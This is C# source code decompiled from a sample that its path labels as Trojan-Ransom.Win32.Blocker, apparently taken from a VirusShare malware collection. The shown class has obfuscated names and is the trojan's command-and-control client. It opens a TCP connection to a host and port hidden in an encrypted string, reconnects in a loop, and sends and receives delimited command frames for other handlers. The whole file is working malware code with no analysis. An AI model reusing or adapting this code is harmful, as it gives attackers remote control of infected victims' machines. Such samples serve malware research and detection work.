// Decompiled with JetBrains decompiler
// Type:  
// Assembly: C, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AECD4788-48C4-479F-A68E-650A413D34DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.hdzx-b05eaa7039890b2e3bc00b0bc2db874ad84b4753c0d19c47e9c03bc831a18253.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;

public sealed class \u0005\u2000
{
  private \u0005\u2000.\u0002 \u0002;
  private \u0005\u2000.\u0003 \u0003;
  private \u0005\u2000.\u0005 \u0005;
  public static TcpClient \u0008;
  public static string \u0006 = \u0008\u2000.\u0002(1696692258);
  private static bool \u000E = false;
  private static bool \u000F = false;
  private string \u0002\u2000;

  public \u0005\u2000() => this.\u0002\u2000 = \u0008\u2000.\u0002(1696692283);

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0002(\u0005\u2000.\u0002 _param1) => this.\u0002 += _param1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0003(\u0005\u2000.\u0002 _param1) => this.\u0002 -= _param1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0002(\u0005\u2000.\u0003 _param1) => this.\u0003 += _param1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0003(\u0005\u2000.\u0003 _param1) => this.\u0003 -= _param1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0002(\u0005\u2000.\u0005 _param1) => this.\u0005 += _param1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void \u0003(\u0005\u2000.\u0005 _param1) => this.\u0005 -= _param1;

  private bool \u0002()
  {
    try
    {
      \u0005\u2000.\u0008.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    \u0005\u2000.\u0008 = new TcpClient();
    bool flag;
    try
    {
      \u0005\u2000.\u0008.Client.Connect(Strings.Split(\u0005\u2000.\u0006, \u0008\u2000.\u0002(1696692694))[0], Conversions.ToInteger(Strings.Split(\u0005\u2000.\u0006, \u0008\u2000.\u0002(1696692694))[1]));
      \u0005\u2000.\u0008.Client.SendBufferSize = 999999;
      \u0005\u2000.\u0008.Client.ReceiveBufferSize = 999999;
      \u0005\u2000.\u0008.Client.SendTimeout = -1;
      \u0005\u2000.\u0008.Client.ReceiveTimeout = -1;
      new Thread(new ThreadStart(this.\u0005), 100).Start();
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public void \u0002()
  {
    while (true)
    {
      do
      {
        Thread.Sleep(1500);
      }
      while (\u000F.\u0006);
      if (\u0005\u2000.\u000E)
      {
        \u0005\u2000.\u000F = true;
      }
      else
      {
        \u0005\u2000.\u000F = false;
        \u0005\u2000.\u000E = false;
        this.\u0002();
      }
    }
  }

  public void \u0003()
  {
    try
    {
      \u0005\u2000.\u0008.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public bool \u0002(byte[] _param1)
  {
    bool flag;
    if (\u000F.\u0006)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        memoryStream.Write(_param1, 0, _param1.Length);
        memoryStream.Write(\u000F.\u0002(ref this.\u0002\u2000), 0, this.\u0002\u2000.Length);
        \u0005\u2000.\u0008.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
    }
    return flag;
  }

  public bool \u0002(string _param1) => this.\u0002(\u000F.\u0002(ref _param1));

  public void \u0005()
  {
    \u0005\u2000.\u0002 obj1 = this.\u0002;
    if (obj1 != null)
      obj1();
    \u0005\u2000.\u000E = true;
    \u0005\u2000.\u000F = false;
    int num = 0;
    MemoryStream memoryStream = new MemoryStream();
    while (true)
    {
      checked { ++num; }
      if (!(!\u0005\u2000.\u000E | \u0005\u2000.\u000F))
      {
        try
        {
          if (\u0005\u2000.\u0008 != null)
          {
            if (\u0005\u2000.\u0008.Client.Connected)
            {
              if (\u0005\u2000.\u0008.Client.Available > 0)
              {
                byte[] buffer = new byte[checked (\u0005\u2000.\u0008.Client.Available - 1 + 1)];
                \u0005\u2000.\u0008.Client.Receive(buffer, 0, buffer.Length, SocketFlags.None);
                memoryStream.Write(buffer, 0, buffer.Length);
              }
              while (true)
              {
                byte[] array = memoryStream.ToArray();
                if (\u000F.\u0002(ref array).Contains(this.\u0002\u2000))
                {
                  Array Instance = this.\u0002(memoryStream.ToArray());
                  \u0005\u2000.\u0005 obj2 = this.\u0005;
                  if (obj2 != null)
                    obj2((byte[]) NewLateBinding.LateIndexGet((object) Instance, new object[1]
                    {
                      (object) 0
                    }, (string[]) null));
                  memoryStream.Dispose();
                  memoryStream = new MemoryStream();
                  if (Instance.Length == 2)
                    memoryStream.Write((byte[]) NewLateBinding.LateIndexGet((object) Instance, new object[1]
                    {
                      (object) 1
                    }, (string[]) null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object) Instance, new object[1]
                    {
                      (object) 1
                    }, (string[]) null), (Type) null, \u0008\u2000.\u0002(1696692231), new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
                  else
                    break;
                }
                else
                  break;
              }
              if (num > 300)
              {
                num = 0;
                if (\u0005\u2000.\u0008.Client.Connected)
                {
                  try
                  {
                    if (\u0005\u2000.\u0008.Client.Poll(-1, SelectMode.SelectRead) & \u0005\u2000.\u0008.Client.Available <= 0)
                      break;
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                    break;
                  }
                }
                else
                  break;
              }
              Thread.Sleep(1);
            }
            else
              break;
          }
          else
            break;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          break;
        }
      }
      else
        break;
    }
    \u0005\u2000.\u000E = false;
    \u0005\u2000.\u0003 obj3 = this.\u0003;
    if (obj3 == null)
      return;
    obj3();
  }

  public Array \u0002(byte[] _param1)
  {
    List<byte[]> numArrayList = new List<byte[]>();
    MemoryStream memoryStream1 = new MemoryStream();
    MemoryStream memoryStream2 = new MemoryStream();
    string[] strArray = Strings.Split(\u000F.\u0002(ref _param1), this.\u0002\u2000);
    memoryStream1.Write(_param1, 0, strArray[0].Length);
    memoryStream2.Write(_param1, checked (strArray[0].Length + this.\u0002\u2000.Length), checked (_param1.Length - strArray[0].Length + this.\u0002\u2000.Length));
    numArrayList.Add(memoryStream1.ToArray());
    numArrayList.Add(memoryStream2.ToArray());
    memoryStream1.Dispose();
    memoryStream2.Dispose();
    return (Array) numArrayList.ToArray();
  }

  public delegate void \u0002();

  public delegate void \u0003();

  public delegate void \u0005(byte[] _param1);
}
